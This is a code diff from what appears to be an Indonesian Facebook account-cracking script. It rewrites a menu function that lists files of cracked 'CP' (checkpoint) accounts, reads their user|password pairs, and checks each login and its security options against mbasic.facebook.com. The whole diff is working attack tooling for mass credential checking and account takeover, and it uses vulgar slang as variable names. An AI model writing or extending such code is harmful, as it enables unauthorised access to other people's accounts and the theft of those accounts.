@@ -207,7 +207,7 @@ def infotambahan():
 	if fall == "":
 		menu()
         elif fall == "1":
-		cek_hasil()
+		cekopsi()
 	elif fall == "2":
 		cekhasil()
 	elif fall == "3":
@@ -408,32 +408,33 @@ def gantiua():
 
 
 ####CEK OPSI HASIL CRACK####
-def cek_hasil():
-    jalan('%s[ %sCheck Crack Result Account Options %s]'%(O,P,O))
-    print('%s'%(O))
-    print('%s[%s•%s] %sExample File : CP/%s.txt'%(O,P,O,P,tanggal))
-    files = input('%s[%s•%s] %sFile : '%(O,P,O,P))
-    try:
-        buka_baju = open(files,"r").readlines()
-    except FileNotFoundError:
-        print("%s[%s!%s] %sFile Not Existing"%(M,P,M,P))
-        time.sleep(2); cek_hasil()
-    print("%s[%s•%s] %sNumber of Accounts : %s"%(O,P,O,P,str(len(buka_baju))))
-    print("")
-    for memek in buka_baju:
-        kontol = memek.replace("\n","")
-        titid  = kontol.split("•")
-        print("%s[%s•%s] %sCheck Login : %s"%(O,P,O,P,kontol))
-        try:
-            log_hasil(titid[0], titid[1])
-        except requests.exceptions.ConnectionError:
-            continue
-        print("")
-    print("")
-    print('%s[%s•%s] %s Checking Process Complete'%(O,P,O,P))
-    print('%s'%(O))
-    input('%s[ %sReturn %s]%s'%(O,P,O,P))
-    menu()
+def cekopsi():
+	dirs = os.listdir("CP")
+	print("")
+	for file in dirs:
+		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] CP/"+file)
+	print("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] masukan file (ex: CP/%s.txt)"%(tanggal))
+	files = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mnama file  \x1b[1;97m: \x1b[1;92m")
+	if files == "":
+		menu()
+	try:
+		buka_baju = open(files, "r").readlines()
+	except IOError:
+		exit("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] nama file %s tidak tersedia"%(files))
+	ubahpw()
+	print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses cek')
+	for memek in buka_baju:
+		kontol = memek.replace("\n","")
+		titid  = kontol.split("|")
+		print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
+		try:
+			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
+		except requests.exceptions.ConnectionError:
+			pass
+	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mcek akun sudah selesai\x1b[1;97m...")
+	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu ")
+	time.sleep(1)
+	menu()
 	
 def check_in(user, pasw):
 	mb = ("https://mbasic.facebook.com")
